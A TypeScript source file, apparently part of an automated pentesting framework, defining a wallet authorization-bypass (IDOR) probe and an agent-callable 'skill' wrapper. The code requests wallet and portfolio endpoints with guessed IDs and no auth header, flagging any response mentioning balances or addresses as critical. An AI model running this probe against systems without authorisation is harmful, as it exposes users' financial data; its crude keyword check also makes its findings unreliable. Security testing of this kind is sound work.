import type { AttackResult } from '../types'

// Wallet IDs to probe — IDOR check: can we read other users' wallets without auth?
const PROBE_IDS = ['1', '2', 'admin', '0x742d35Cc']

const WALLET_PATHS = ['/api/wallet', '/api/wallets', '/wallet', '/api/portfolio']

export async function walletAuthAttack(targetUrl: string): Promise<AttackResult> {
  for (const basePath of WALLET_PATHS) {
    for (const id of PROBE_IDS) {
      try {
        const res = await fetch(`${targetUrl}${basePath}/${id}`, {
          signal: AbortSignal.timeout(5000),
        })

        if (!res.ok) continue

        const data = (await res.json()) as Record<string, unknown>
        const text = JSON.stringify(data).toLowerCase()

        // Successful auth bypass: returned balance, address, or tx data with no auth header sent
        const bypassed =
          text.includes('balance') ||
          text.includes('address') ||
          text.includes('transaction') ||
          text.includes('0x') ||
          text.includes('usdc') ||
          text.includes('btc')

        if (bypassed) {
          return {
            success: true,
            attackType: 'CREDENTIAL_EXPOSURE',
            vulnerability: `Wallet authorization bypass (IDOR) at ${basePath}/:id — no authentication required`,
            location: `${basePath}/${id}`,
            severity: 'CRITICAL',
            payload: `GET ${basePath}/${id} (no auth header)`,
            evidence: JSON.stringify(data).slice(0, 200),
            timestamp: Date.now(),
          }
        }
      } catch {
        continue
      }
    }
  }

  return {
    success: false,
    attackType: 'CREDENTIAL_EXPOSURE',
    vulnerability: 'No wallet authorization bypass found',
    location: 'wallet endpoints',
    severity: 'LOW',
    timestamp: Date.now(),
  }
}

export const walletAuthSkill = {
  name: 'wallet_auth_bypass',
  description:
    'Tests wallet and portfolio endpoints for authorization bypass (IDOR). Probes endpoints without an auth header and checks if sensitive balance or transaction data is returned.',
  input_schema: {
    type: 'object' as const,
    properties: {
      targetUrl: { type: 'string', description: 'Base URL of the target' },
    },
    required: ['targetUrl'],
  },
  execute: async ({ targetUrl }: { targetUrl: string }) => walletAuthAttack(targetUrl),
}
